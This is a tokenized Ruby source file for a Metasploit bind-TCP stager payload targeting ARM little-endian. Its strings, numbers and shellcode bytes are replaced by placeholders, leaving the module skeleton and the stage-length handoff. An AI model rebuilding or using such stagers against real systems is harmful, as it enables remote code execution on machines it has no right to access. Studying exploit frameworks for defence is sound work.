require <str> require <str> module Metasploit3 CachedSize = <int> include Msf :: Payload :: Stager def initialize ( info = { } ) super ( merge_info ( info , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > <str> , <str> = > ARCH_ARMLE , <str> = > Msf :: Handler :: BindTcp , <str> = > { <str> = > { <str> = > [ <int> , <str> ] , } , <str> = > [ <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> ] . pack ( <str> ) } ) ) end def handle_intermediate_stage ( conn , payload ) print_status ( <str> payload . length <str> ) address_format = <str> conn . put ( [ payload . length ] . pack ( address_format ) ) return true end end 
